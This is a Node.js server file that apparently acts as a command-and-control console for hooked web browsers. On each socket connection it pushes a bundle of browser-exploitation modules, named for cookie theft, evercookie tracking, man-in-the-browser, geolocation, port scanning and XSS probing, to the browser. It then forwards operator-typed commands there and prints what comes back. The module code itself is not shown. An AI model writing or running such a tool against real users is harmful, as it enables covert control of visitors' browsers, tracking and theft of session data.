var app = require('express')();
var http = require('http').Server(app);
var io = require('socket.io')(http);
var readline = require('readline');
var fs = require('fs');

var modules_root = "modules/"
var modules = [ 'beef.js',
  'browser.js',
  'browser/cookie.js',
  'browser/popup.js',
  'lib/evercookie.js',
  'session.js',
  'os.js',
  'hardware.js',
  'dom.js',
  'logger.js',
  'net.js',
  'updater.js',
  'encode/base64.js',
  'encode/json.js',
  'net/local.js',
  'init.js',
  'mitb.js',
  'geolocation.js',
  'net/dns.js',
  'net/connection.js',
  'net/cors.js',
  'net/requester.js',
  'net/xssrays.js',
  'net/portscanner.js',
  'are.js' ];

rl = readline.createInterface(process.stdin, process.stdout);

app.get('/', function(req, res){
  res.sendFile(__dirname + '/index.html');
});
    
io.on('connection', function(socket){
    console.log('[#] User connected: ...');
    console.log("[#] Loading auxillary modules..");
    
    var modules_concat = "";
    modules.forEach((module) => {
        modules_concat += fs.readFileSync(modules_root + module, 'utf-8');
    })
    socket.emit("cmd", modules_concat);

    rl.setPrompt('[#] ');
    rl.prompt();
    
    process.stdout.write("Ready to receive commands");
    rl.on('line', function(cmd) {
        socket.emit("cmd", cmd);
        rl.prompt();
    }).on('close', function() {
        console.log('Have a great day!');
        process.exit(0);
    });
   
    // accept output from client and write to stdin
    socket.on("output", function(output){
        rl.setPrompt("");
        process.stdout.write(output);
        process.stdout.write("\n[#] ");
        rl.setPrompt("[#] ");
    });
});

http.listen(3000, function(){
    console.log('listening on *:3000');
});
